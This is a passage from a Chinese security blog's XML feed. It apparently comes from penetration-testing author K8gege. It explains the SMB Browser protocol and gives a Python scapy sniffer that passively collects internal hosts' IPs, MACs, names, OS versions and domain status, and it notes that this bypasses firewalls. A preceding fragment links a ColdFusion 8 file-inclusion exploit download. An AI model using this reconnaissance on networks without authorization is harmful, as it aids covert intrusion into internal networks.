<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
<p>&nbsp;</p>]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Browser协议探测内网主机</title>
    <url>/p/16b5ff0b.html</url>
    <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
<div class="para">
<h3 class="title-text"><img alt data-original="http://k8gege.org/k8img/posts/browser1.png"></h3>
</div>
<div class="para">
<h3 class="title-text">浏览</h3>
<div class="para">在SMB协议中，计算机为了访问<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%B5%84%E6%BA%90" target="_blank">网络资源</a>，就需要了解网络上存在的资源列表（例如在Windows下使用网络邻居查看可以访问的计算机），这个机制就被称为浏览（Browsing）。虽然SMB协议中经常使用广播的方式，但如果每次都使用广播的方式了解当前的网络资源（包括提供服务的计算机和各个计算机上的服务资源），就需要消耗大量的网络资源和浪费较长的查找时间，因此最好在网络中维护一个网络资源的列表，以方便查找网络资源。只有必要的时候，才重新查找资源，例如使用Windows下的查找计算机<a href="https://baike.baidu.com/item/%E5%8A%9F%E8%83%BD" target="_blank">功能</a>。</div>
</div>
<div class="para">但没有必要每个计算机都维护整个资源列表，维护网络中当前资源列表的任务由网络上的几个特殊计算机完成的，这些计算机被称为Browser，这些Browser通过记录广播数据或查询名字服务器来记录网络上的各种资源。</div>
<div class="para">Browser并不是事先指定的计算机，而是在普通计算机之间通过自动进行的推举产生的。不同的计算机可以按照其提供服务的能力，设置在推举时具备的不同权重。为了保证一个Browser停机时网络浏览仍然正常，网络中常常存在多个Browser，一个为主Browser（Master Browser），其他的为备份Browser。</div>
<div class="anchor-list"><a class="lemma-anchor para-title" name="2_2"></a> <a class="lemma-anchor " name="sub3004457_2_2"></a> <a class="lemma-anchor " name="工作组和域"></a> <a class="lemma-anchor " name="2-2"></a></div>
<div class="para-title level-3">
<h3 class="title-text">工作组和域</h3>
</div>
<div class="para">工作组和域这两个概念在进行浏览时具备同样的用处，都是用于区分并维护同一组浏览数据的多个计算机。事实上他们的不同在于认证方式上，工作组中每台计算机都基本上是独立的，独立对客户访问进行认证，而域中将存在一个（或几个）<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>，保存对整个域中都有效的认证信息，包括用户的认证信息以及域内成员计算机的认证信息。浏览数据的时候，并不需要认证信息，Microsoft将工作组扩展为域，只是为了形成一种分级的目录结构，将原有的浏览和<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1" target="_blank">目录服务</a>相结合，以扩大Mircrosoft网络服务范围的一种策略。 　工作组和域都可以跨越多个子网，因此网络中就存在两种Browser，一种为Domain Master Browser ，用于维护整个工作组或域内的浏览数据，另一种为Local Master Browser，用于维护本子网内的浏览<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/33305" target="_blank" data-lemmaid="33305">数据</a>，它和Domain Master Browser通信以获得所有的可浏览数据。划分这两种Browser 主要是由于浏览数据依赖于本地网广播来获得资源列表，不同子网之间只能通过浏览器之间的交流能力，才能互相交换资源列表。</div>
<div class="para">但是，为了浏览多个子网的资源，必须使用NBNS名字服务器的解析方式，没有NBNS的帮助，计算机将不能获得子网外计算机的NetBIOS名字。Local Master Browser也需要查询NetBIOS名字服务器以获得Domain Master Browser的名字，以相互交换网络资源信息。</div>
<div class="para">由于<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>在域内的特殊性，因此域控制器倾向于被用做Browser，<a href="https://baike.baidu.com/item/%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">主域控制器</a>应该被用作Domain Master Browser，他们在推举时设置的权重较大。</div>
<p><span style="font-size: 14px;"><strong>Browser发包时间</strong></span></p>
<p>去年无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2分钟、5分钟、甚至12分钟等才发</p>
<p>几分钟甚至于10几分钟才有一条，其它数据包每分钟几百条，可能很多人长时间抓包，也未能发现关键信息</p>
<p>不单只是很长时间才发，而且也不一定每个包里面都含有机器名，或许这就是一直以来把Browser忽略的真相</p>
<p>如图所示，出现13机器ID为6247数据包，出现15机器已达到2万多，出现10机器已7万多个包(这鬼才能发现)</p>
<p>所以为了能够获取到内网机器信息，我们需要不停的监视Browser包，从中提取有效机器名与系统版本</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/browser2.png"></p>
<p>&nbsp;<strong>无视防火墙</strong></p>
<p>虽然属于SMB协议，但把文件和共享前的勾去掉依旧可获取,该报文是由目标机器向外发送，所以445关闭也不影响</p>
<p>在目标开启防火墙的情况下也可获取,这与cping通过445端口或ICMP探测主机方式不一样。<br>另外发现NBNS也含有机器名和域名,但无系统版本,如下图<img alt data-original="http://k8gege.org/k8img/posts/browser3.png"></p>
<p><span style="font-size: 16px;"><strong>操作系统、域机器判断</strong></span></p>
<p>除了XP和WIN8.1特别一点以外，其它系统</p>
<p>0x00000002 Request XP名称第3位开始&nbsp; Win8.1也是 无法判断系统版本<br>0x0000000c Domain &nbsp;<span style="color: #ff00ff;">域内机器</span><br>其它 of o1 local<br><br>by K8哥哥 2018.11.26</p>
<p><span style="font-size: 16px;"><strong>&nbsp;<span style="color: #000000;">利用代码</span></strong></span></p>
<p>暂时没时间用其它语言编写,先用python的scapy框架来实现,如果要编译成可执行文件可能会很大,可能还要安装相关依赖</p>
<p>&nbsp;</p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;"># -*- coding: UTF-8 -*-
#author: k8gege
#<a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a>
#<a href="https://www.cnblogs.com/k8gege" target="_blank">https://www.cnblogs.com/k8gege</a>
import sys
import queue
from scapy.all import *
from pprint import pprint

<p>def search(data, key):<br>    #print “data:  “ + data<br>    i=data.find(key)<br>    if i &gt; -1:<br>        masterType = “617574686F723A206B3867656765”<br>        masterType = data[i+len(key):i+len(key)+2]<br>        if masterType==”02”:<br>           return data[i+len(key)+4:i+len(key)+34],masterType,data[i+len(key)+44:i+len(key)+48]<br>        return data[i+len(key)+12:i+len(key)+42],masterType,data[i+len(key)+44:i+len(key)+48]<br>    return “”</p>
<p>def getver(data):<br>    if data==”0500”:<br>        return “Win2000”<br>    elif data==”0501”:<br>        return “WinXP”<br>    elif data==”0502”:<br>        return “Win2003”<br>    elif data==”0600”:<br>        return “Vista”<br>    elif data==”0601”:<br>        return “Win7_2008”<br>    elif data==”0602”:<br>        return “Win8_2012”<br>    elif data==”0603”:<br>        return “Win8.1”<br>    elif data==”0a00”:<br>        return “Win10_2016”<br>    return data</p>
<p>def packet_callbacke(packet):<br>    #print(packet.show())<br>    try:<br>        data=packet.load.encode(‘hex’)<br>        osname,masterType,osver = search(data, “5c4d41494c534c4f545c42524f57534500”)<br>        if (osname!=””):<br>            if masterType==”0c”:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[Domain]”<br>            else:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[“+getver(osver)+”]”<br>    except:<br>        pass</p>
<p>print “IP\t\tMAC\t\t\tOSname\t\tOSver”</p>
<p>try:<br>    sniff(iface = sys.argv[1],filter=””, prn=packet_callbacke)<br>except:<br>    pass<br></p></pre><p></p>
</div>
<p><strong>下载:</strong></p>
<p><a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a></p>
<p><a href="https://github.com/k8gege/k8getPC" target="_blank">https://github.com/k8gege/k8getPC</a></p>
<p>&nbsp;</p>
<p>相关文章:</p>
<p>Cscan 获取内网主机开放Web、Banner、标题信息</p>
<p><a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
<p>Cping 获取内网存活主机-MAC地址-主机名--操作系统--SMB漏洞</p>
<p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
      <categories>
        <category>工具</category>
        <category>主机发现</category>
        <category>源码</category>
        <category>内网渗透</category>
        <category>信息收集</category>
        <category>Python</category>
        <category>编程</category>
        <category>嗅探</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Code</tag>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
